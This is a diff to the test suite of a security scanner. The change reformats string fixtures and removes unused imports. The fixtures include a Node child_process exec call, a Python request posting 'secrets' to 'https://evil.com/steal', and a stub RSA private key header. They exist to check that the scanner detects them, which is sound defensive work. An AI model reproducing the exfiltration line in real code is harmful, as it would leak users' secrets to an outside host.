@@ -7,23 +7,15 @@ to verify detection accuracy across all six scan phases.
 
 from __future__ import annotations
 
-import pytest
 
 from api.services.scanner import (
     ALL_RULES,
-    CODE_PATTERN_RULES,
-    CREDENTIAL_RULES,
     INSTALL_HOOK_RULES,
-    NETWORK_EXFIL_RULES,
-    OBFUSCATION_RULES,
     PROVENANCE_RULES,
-    Rule,
     scan_content,
-    scan_directory,
-    _scan_content,
     _scan_filename,
 )
-from api.models import Finding, ScanPhase, Severity
+from api.models import ScanPhase, Severity
 
 
 class TestInstallHookDetection:
@@ -104,7 +96,9 @@ class TestCodePatternDetection:
 
     def test_detect_child_process_node(self) -> None:
         """Should detect Node.js child_process usage."""
-        content = "const { exec } = require('child_process');\nchild_process.exec('whoami');"
+        content = (
+            "const { exec } = require('child_process');\nchild_process.exec('whoami');"
+        )
         findings = scan_content(content, "index.js")
         rule_ids = [f.rule for f in findings]
         assert "code-child-process" in rule_ids
@@ -143,7 +137,9 @@ class TestNetworkExfilDetection:
 
     def test_detect_http_request(self) -> None:
         """Should detect outbound HTTP requests."""
-        content = "import requests\nrequests.post('https://evil.com/steal', data=secrets)"
+        content = (
+            "import requests\nrequests.post('https://evil.com/steal', data=secrets)"
+        )
         findings = scan_content(content, "exfil.py")
         rule_ids = [f.rule for f in findings]
         assert "net-http-request" in rule_ids
@@ -168,7 +164,9 @@ class TestCredentialDetection:
 
     def test_detect_private_key(self) -> None:
         """Should detect embedded private keys."""
-        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
+        content = (
+            "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
+        )
         findings = scan_content(content, "id_rsa")
         rule_ids = [f.rule for f in findings]
         assert "cred-ssh-private" in rule_ids
@@ -277,7 +275,9 @@ class TestRuleCompleteness:
         for rule in ALL_RULES:
             assert rule.pattern is not None, f"Rule {rule.id} pattern is None"
             # Patterns are pre-compiled, so this just verifies they exist
-            assert hasattr(rule.pattern, "search"), f"Rule {rule.id} pattern not compiled"
+            assert hasattr(rule.pattern, "search"), (
+                f"Rule {rule.id} pattern not compiled"
+            )
 
 
 class TestBenignCodeNotFlagged:
